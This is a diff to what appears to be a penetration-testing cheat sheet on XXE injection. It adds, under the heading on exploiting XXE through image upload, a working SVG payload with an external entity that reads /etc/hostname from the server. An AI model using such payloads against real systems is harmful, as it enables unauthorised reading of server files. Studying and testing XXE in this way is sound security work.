@@ -521,7 +521,11 @@ I really recommend you to use both links below, because they can adapt XXE paylo
 ### 5. Exploiting XXE via image file upload
 >https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/
 
-
+```
+<?xml version="1.0" standalone="no"?><!DOCTYPE svg[ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
+<svg width="200px" height="100px" xmlns="http://www.w3.org/2000/svg"><text x="0" y="80" font-size="22">&xxe;</text>
+</svg>
+```
 ### 6. Admin user import via XML
 ![image](https://user-images.githubusercontent.com/58632878/225074086-5357aeac-a445-47d8-87e8-a472bf874f6d.png)
 ```
